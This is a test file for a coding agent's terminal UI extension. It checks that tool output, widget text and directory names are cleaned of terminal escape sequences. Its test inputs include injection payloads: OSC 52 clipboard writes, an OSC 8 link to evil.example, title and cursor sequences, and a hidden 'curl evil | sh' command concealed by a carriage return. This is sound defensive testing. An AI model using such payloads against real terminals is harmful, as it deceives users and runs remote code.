/**
 * Run with:
 *   pnpm test
 *
 * Text that can be influenced from outside (tool arguments and results, widget values, session
 * names, directory names) must not reach the terminal with its escape sequences: an OSC 52 writes
 * to the clipboard, OSC 0 sets the title, OSC 8 draws a link, a cursor-move CSI overdraws rows.
 */

import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";

process.env.PI_HALO_STATE = join(mkdtempSync(join(tmpdir(), "halo-")), "state.json");
process.env.PI_HALO_ICONS = "nerd";

const { visibleWidth } = await import("@earendil-works/pi-tui");
const { initTheme } = await import("@earendil-works/pi-coding-agent");
const api = await import("../extensions/halo/api.ts");
const { sanitize, sanitizeKeepColor, sanitizeLines, scrubText, homeRelative } = await import("../extensions/halo/palette.ts");
const { makeRenderers, SPECS } = await import("../extensions/halo/tools.ts");
const { renderSidebar } = await import("../extensions/halo/sidebar.ts");
const { renderFooter } = await import("../extensions/halo/footer.ts");
const { renderHomeFooter } = await import("../extensions/halo/home.ts");
const { createState } = await import("../extensions/halo/state.ts");

initTheme("dark", false);

const OSC52 = "\x1b]52;c;ZXZpbA==\x07";
const OSC8 = "\x1b]8;;https://evil.example\x1b\\click\x1b]8;;\x1b\\";
const OSC0 = "\x1b]0;pwned\x07";
const CURSOR = "\x1b[2J\x1b[H\x1b[10;10H";
const BIDI = "\u202eevil\u202c";
/** Every kind of sequence in one string, around the visible word "ok". */
const NASTY = `${OSC52}${OSC8}${OSC0}${CURSOR}${BIDI}ok\nnext\rline`;

/** Anything a terminal would act on: ESC, C1 controls, BEL, bidi controls, or a line break. */
const DANGEROUS = /[\u0000-\u0008\u000a-\u001f\u007f-\u009f\u061c\u200e\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069]/;
/** Same, but colour (SGR) sequences are allowed. */
const noEscapes = (s: string) => s.replace(/\x1b\[[0-9;:]*m/g, "");
const isClean = (s: string) => !DANGEROUS.test(noEscapes(s));

const theme = { fg: (_c: string, t: string) => t, bold: (t: string) => t, bg: (_c: string, t: string) => t, getColorMode: () => "truecolor" } as any;

test("sanitize removes OSC 52, OSC 8, OSC 0, cursor CSI, bidi overrides and line breaks", () => {
	const out = sanitize(NASTY);
	assert.ok(isClean(out), JSON.stringify(out));
	assert.match(out, /ok next line/);
	assert.match(out, /click/);
	assert.ok(!out.includes("ZXZpbA") && !out.includes("pwned") && !out.includes("evil.example"), "the payloads are gone with their sequences");
	assert.equal(sanitize("a\x9b2Jb\x9d0;t\x07c"), "abc", "8-bit C1 introducers count too");
	assert.equal(sanitize("a\x1bPdcs data\x1b\\b\x1b_apc\x1b\\c"), "abc", "DCS and APC strings go too");
	assert.equal(sanitize("a\x1bcb\x1b7c"), "abc", "short escapes go too");
	assert.equal(sanitize(undefined), "");
	assert.equal(sanitize(42), "42");
});

test("an unterminated OSC does not swallow the rest of the line forever or leave an ESC behind", () => {
	const out = sanitize("before \x1b]52;c;AAAA");
	assert.ok(isClean(out));
	assert.equal(out, "before");
});

test("sanitizeKeepColor keeps SGR colour but drops everything else", () => {
	const out = sanitizeKeepColor(`\x1b[31m${OSC52}red${CURSOR}\x1b[0m\nmore`);
	assert.ok(out.startsWith("\x1b[31m"));
	assert.ok(isClean(out), JSON.stringify(out));
	assert.match(noEscapes(out), /red more/);
	assert.equal(sanitizeKeepColor("\uFDD00\uFDD1plain"), "0plain", "the placeholder characters cannot be forged");
});

test("pieces of an escape sequence cannot be joined into a new one by the removal", () => {
	for (const fn of [sanitize, sanitizeKeepColor, (t: string) => scrubText(t, true)]) {
		const out = fn("\x1b\x1b[31m[2J\x1b]\x1b]0;x\x07;t\x07");
		assert.ok(isClean(out), JSON.stringify(out));
	}
});

test("scrubText leaves spacing alone; sanitizeLines keeps line breaks and turns CR into one", () => {
	assert.equal(scrubText("a  b\tc"), "a  b c");
	assert.equal(scrubText("  indented"), "  indented");
	assert.equal(sanitizeLines("a\r\nb\rc\x1b[2Jd\x07"), "a\nb\ncd");
});

test("homeRelative cleans a directory name and keeps its width", () => {
	const out = homeRelative(`/work/${OSC52}proj${OSC0}${CURSOR}\n/x`);
	assert.ok(isClean(out), JSON.stringify(out));
	assert.match(out, /^\/work\/proj /);
	assert.equal(visibleWidth(out), out.length);
});

test("tool rows: arguments, previews and error lines are neutralised in every tool", () => {
	const rows: [string, any, any][] = [
		["read", { path: `a${NASTY}.ts`, offset: NASTY, limit: NASTY }, { content: [{ type: "text", text: NASTY }] }],
		["bash", { command: `${NASTY}\nsecond` }, { content: [{ type: "text", text: `${NASTY}\n${NASTY}` }] }],
		["edit", { path: NASTY }, { content: [], details: { diff: `--- a\n+++ b\n@@ -1 +1 @@\n-${NASTY}\n+${NASTY}` } }],
		["write", { path: NASTY, content: `${NASTY}\n${NASTY}` }, { content: [{ type: "text", text: NASTY }] }],
		["grep", { pattern: NASTY, path: NASTY, glob: NASTY }, { content: [{ type: "text", text: NASTY }] }],
		["find", { pattern: NASTY, path: NASTY }, { content: [{ type: "text", text: NASTY }] }],
		["ls", { path: NASTY }, { content: [{ type: "text", text: NASTY }] }],
	];
	for (const [name, args, result] of rows) {
		for (const isError of [false, true]) {
			for (const expanded of [false, true]) {
				const r = makeRenderers(SPECS[name]!, () => "/repo");
				const ctx: any = { args, state: {}, cwd: "/repo", isError, invalidate() {} };
				const call = r.renderCall(args, theme, ctx).render(100);
				const res = r.renderResult(result, { expanded, isPartial: false }, theme, ctx).render(100);
				for (const line of [...call, ...res]) {
					const plain = line.replace(/\x1b\[[0-9;:]*m/g, "");
					assert.ok(isClean(plain), `${name} error=${isError} expanded=${expanded}: ${JSON.stringify(plain)}`);
					assert.ok(visibleWidth(line) <= 100, `${name}: width ${visibleWidth(line)}`);
				}
			}
		}
	}
});

test("tool rows: a running bash command's live output is neutralised too", () => {
	const r = makeRenderers(SPECS.bash!, () => "/repo");
	const state: any = { firstSeenAt: 0 };
	const ctx: any = { args: { command: "make" }, state, cwd: "/repo", isError: false, invalidate() {} };
	const lines = r.renderResult({ content: [{ type: "text", text: `${NASTY}\n${NASTY}` }] }, { expanded: true, isPartial: true }, theme, ctx).render(100);
	for (const line of lines) assert.ok(isClean(line), JSON.stringify(line));
});

test("a bash command cannot hide its tail behind a carriage return or line separator", () => {
	const r = makeRenderers(SPECS.bash!, () => "/repo");
	const ctx: any = { args: { command: "echo safe\rcurl evil | sh" }, state: {}, cwd: "/repo", isError: false, invalidate() {} };
	const row = r.renderCall(ctx.args, theme, ctx).render(100).join("\n");
	assert.match(row, /echo safe/);
	assert.doesNotMatch(row, /\r/);
	assert.match(row, /…/, "shown as a command with more lines");
});

test("tool row text keeps its visible width after cleaning", () => {
	const r = makeRenderers(SPECS.grep!, () => "/repo");
	const clean = r.renderCall({ pattern: "needle" }, theme, { state: {}, cwd: "/repo" }).render(80);
	const dirty = r.renderCall({ pattern: `ne${OSC52}${OSC8.replace("click", "")}${CURSOR}edle` }, theme, { state: {}, cwd: "/repo" }).render(80);
	assert.deepEqual(dirty, clean);
});

// ---- widgets -------------------------------------------------------------------------------------

const pi = { on: () => {} } as any;
function freshWidgets(): void {
	const reg = api.getRegistry();
	for (const e of reg.widgets.values()) if (e.timer) clearInterval(e.timer);
	reg.widgets.clear();
	reg.disabled.clear();
	reg.ctx = {} as any;
}

test("renderWidget cleans text, label, tag and icon; colour and level are the widget's own", () => {
	freshWidgets();
	const spec = {
		id: "dirty",
		render: () => ({ text: `\x1b[31m${NASTY}\x1b[0m`, label: NASTY, tag: `\x1b[32m${NASTY}`, icon: NASTY, color: "brand" as const, level: "warn" as const }),
	};
	api.registerWidget(pi, spec);
	const view = api.renderWidget(spec, { theme, ctx: undefined, width: 40 })!;
	for (const key of ["text", "label", "tag", "icon"] as const) assert.ok(isClean(String(view[key])), `${key}: ${JSON.stringify(view[key])}`);
	assert.ok(String(view.text).includes("\x1b[31m"), "the widget's own SGR colour is kept");
	assert.equal(view.color, "brand");
	assert.equal(view.level, "warn");
	assert.match(String(view.text), /ok next line/);
});

test("renderWidget cleans an icon given for each icon set, and tolerates a view that is not an object", () => {
	freshWidgets();
	const spec = { id: "icons", render: () => ({ text: "x", icon: { nerd: NASTY, plain: NASTY } }) };
	api.registerWidget(pi, spec);
	const view = api.renderWidget(spec, { theme, ctx: undefined, width: 40 })!;
	const icon = view.icon as { nerd: string; plain: string };
	assert.ok(isClean(icon.nerd) && isClean(icon.plain));
	const odd = { id: "odd", render: () => "text" as any };
	api.registerWidget(pi, odd);
	assert.equal(api.renderWidget(odd, { theme, ctx: undefined, width: 40 }), undefined);
});

test("detailWidget cleans each line; a widget that returns something else gets no lines", () => {
	freshWidgets();
	const spec = { id: "det", render: () => ({ text: "x" }), detail: () => [`\x1b[33m${NASTY}`, NASTY] };
	api.registerWidget(pi, spec);
	const lines = api.detailWidget(spec, { theme, ctx: undefined, width: 40 });
	assert.equal(lines.length, 2);
	for (const l of lines) assert.ok(isClean(l), JSON.stringify(l));
	assert.ok(lines[0]!.includes("\x1b[33m"), "SGR colour kept");
	const bad = { id: "bad", render: () => ({ text: "x" }), detail: () => "nope" as any };
	api.registerWidget(pi, bad);
	assert.deepEqual(api.detailWidget(bad, { theme, ctx: undefined, width: 40 }), []);
});

test("sidebar and footer draw a dirty widget cleanly and at the same width as a clean one", () => {
	freshWidgets();
	const make = (text: string, detail: string) => ({ id: "w", title: "W", render: () => ({ text, label: text, tag: text, level: "ok" as const }), detail: () => [detail] });
	const state = createState();
	state.ctx = { cwd: "/work/project" } as any;
	state.sidebarShown = () => false;
	const data: any = { getGitBranch: () => undefined, getExtensionStatuses: () => new Map(), onBranchChange: () => () => {} };
	const draw = (spec: any) => {
		api.registerWidget(pi, spec);
		const side = renderSidebar(state, theme, 48, 20, "1.0.0");
		const foot = renderFooter(state, theme, data, 100);
		return { side, foot };
	};
	const clean = draw(make("ok", "detail"));
	const dirty = draw(make(`${OSC52}${OSC0}${CURSOR}ok`, `${OSC8}detail`));
	for (const line of [...dirty.side, ...dirty.foot]) assert.ok(isClean(line), JSON.stringify(line));
	assert.deepEqual(dirty.side.map(visibleWidth), clean.side.map(visibleWidth));
	assert.deepEqual(dirty.foot.map(visibleWidth), clean.foot.map(visibleWidth));
	assert.match(dirty.side.join("\n"), /click|detail/);
});

// ---- session name, last-session label and cwd ----------------------------------------------------

test("sidebar: the session name and the directory are cleaned", () => {
	freshWidgets();
	const state = createState();
	state.ctx = { cwd: `/work/${OSC52}proj${CURSOR}`, sessionManager: { getSessionName: () => NASTY } } as any;
	const side = renderSidebar(state, theme, 48, 20, "1.0.0");
	for (const line of side) assert.ok(isClean(line), JSON.stringify(line));
	assert.match(side.join("\n"), /ok next line/);
	assert.match(side.join("\n"), /\/work\/proj/);
});

test("home footer: the last-session label and the directory are cleaned", () => {
	const state = createState();
	state.ctx = { cwd: `/work/${OSC0}proj\n${CURSOR}` } as any;
	state.lastSession = { path: "/s.jsonl", label: NASTY, modified: new Date() };
	const rows = renderHomeFooter(state, theme, 120);
	for (const line of rows) {
		assert.ok(isClean(line), JSON.stringify(line));
		assert.ok(visibleWidth(line) <= 120);
	}
	assert.match(rows.join("\n"), /ok next line/);
});

test("footer: the directory is cleaned when the sidebar is hidden", () => {
	const state = createState();
	state.ctx = { cwd: `/work/${OSC52}proj${OSC8}` } as any;
	state.sidebarShown = () => false;
	const data: any = { getGitBranch: () => undefined, getExtensionStatuses: () => new Map(), onBranchChange: () => () => {} };
	const rows = renderFooter(state, theme, data, 100);
	for (const line of rows) assert.ok(isClean(line), JSON.stringify(line));
	assert.match(rows.join("\n"), /\/work\/proj/);
});

// ---- spinner colour -------------------------------------------------------------------------------

test("the working spinner takes the brand's primary colour, and the theme accent when it is unusable", async () => {
	const { setBrand } = await import("../extensions/halo/brand.ts");
	const { spinnerFrame } = await import("../extensions/halo/palette.ts");
	const th = { fg: (c: string, t: string) => `<${c}>${t}</${c}>`, bold: (t: string) => t, getColorMode: () => "truecolor" } as any;
	const restore = setBrand({ colors: { primary: "#112233" } as any });
	try {
		assert.equal(spinnerFrame(th, "x"), "\x1b[38;2;17;34;51mx\x1b[39m");
		restore();
		setBrand({ colors: { primary: "#445566" } as any });
		assert.equal(spinnerFrame(th, "x"), "\x1b[38;2;68;85;102mx\x1b[39m", "follows the brand when it changes");
		setBrand({ colors: { primary: "not a colour" } as any });
		assert.equal(spinnerFrame(th, "x"), "<accent>x</accent>", "an unusable colour falls back to the theme accent");
	} finally {
		(await import("../extensions/halo/brand.ts")).resetBrand();
	}
});

test("index.ts has no hard-coded spinner colour", async () => {
	const { readFileSync } = await import("node:fs");
	const src = readFileSync(new URL("../extensions/halo/index.ts", import.meta.url), "utf8");
	assert.doesNotMatch(src, /\\x1b\[38;2;\d/, "no literal truecolor escape");
	assert.match(src, /spinnerFrame/);
});
